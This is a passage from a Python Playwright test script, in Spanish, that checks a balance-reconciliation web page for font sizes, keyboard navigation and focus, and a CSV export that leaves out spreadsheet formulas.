                        fmin:Math.min(...[...document.querySelectorAll('.dlist li span,#tarjetas .tj b,#tarjetas .tj .tl')].filter(e=>e.offsetParent).map(e=>parseFloat(getComputedStyle(e).fontSize)))})""")
                    assert not m["d"], m
                    if mov:
                        assert m["lst"] == "block" and m["svg"] == "none" and m["tj"] == "block" and m["fmin"] >= 12, m

                if w in (390, 1280):
                    @prueba("M07", f"{w}px: ordenar, abrir detalle y volver solo con teclado (el foco vuelve al origen)")
                    def _():
                        pg.focus("#cab .ord[data-k=saldo]") if not mov else pg.click("#bvista")
                        if mov:
                            pg.focus("#cab .ord[data-k=saldo]")
                        pg.keyboard.press("Enter")
                        assert pg.get_attribute("#cab th:nth-child(4)", "aria-sort") in ("descending", "ascending")
                        assert pg.evaluate("document.activeElement.dataset.k") == "saldo"
                        pg.focus("#cuerpo tr[data-s]")
                        s = pg.evaluate("document.activeElement.dataset.s")
                        pg.keyboard.press("Enter")
                        assert pg.evaluate("document.activeElement.id") == "det"
                        pg.keyboard.press("Escape")
                        assert pg.evaluate("document.activeElement.dataset.s") == s

                    @prueba("M01/M10", f"{w}px: el CSV lleva fechas, tolerancia y estados; no exporta fórmulas")
                    def _():
                        with pg.expect_download() as dl:
                            pg.click("#bcsv")
                        t = open(dl.value.path(), encoding="utf-8-sig").read()
                        assert "tolerancia para «sin variación»: ±S/ 1" in t and "Variación entre cortes 11/11 a 12/11" in t
                        assert t.count("Ajuste neto negativo") == 2 and ";-140;" in t and ";-6486.75;" in t
                        assert all(not ln.split(";")[1].startswith(("=", "+", "@")) for ln in t.splitlines()[8:] if ";" in ln)
                pg.close()
            b.close()
    finally:
        h.shutdown()
        shutil.rmtree(tmp)


def main():
    if "--interfaz" in sys.argv:
        try:
            interfaz()
        except ImportError:
            RES.append((False, "M06", "Playwright no está instalado: no se pudo probar la interfaz", ""))
    falla = [r for r in RES if not r[0]]
    for ok, h, n, det in RES:
        print(("OK    " if ok else "FALLA ") + f"[{h}] {n}" + (f" · {det}" if det else ""))
    print(f"{len(RES) - len(falla)} de {len(RES)} pruebas conformes")
    sys.exit(1 if falla else 0)


if __name__ == "__main__":
    main()
